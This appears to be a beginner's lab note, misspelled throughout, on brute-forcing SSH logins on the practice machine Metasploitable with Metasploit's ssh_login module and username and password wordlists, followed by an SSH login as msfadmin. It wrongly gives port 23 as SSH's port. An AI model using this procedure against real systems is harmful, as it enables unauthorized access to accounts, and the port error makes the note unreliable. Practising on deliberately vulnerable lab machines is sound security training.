try to hack metasploitable via ssh:

we know that ssh is open port on metasploitable 23 

Here we are tring to hack metasploitable via brute force tecqunic into ssh 23 port

IN this attact we are not tring to find flow of the ssh but we are assume that some body 
excess ssh with weak password and user name. So we are tring to gase user name and password to
assess as a admin. 

for that we use username.txt and password.txt file (where lot's of common user name and 
password have) but we use few username and password for timing porpuse.

for macthing password:

stap1: type in terminal msfconsole
stap2: search for ssh_login
stap3: use 0 from that search result
stap4: options
stap5: set remote hosts bye typing (set RHOSTS 10.0.2.5)
stap6: set VERBOSE true
stap7: set STOP_ON_SUCCESS true 
stap8: set USER_FILE path_of_the_file
stap9: set PASS_FILE path_of_the_pass_file
stap10:run

for exploit via knowing password:
ssh msfadmin@targe_machine_ip
and than give password of this target machine 

that's it boom now we hack that machine
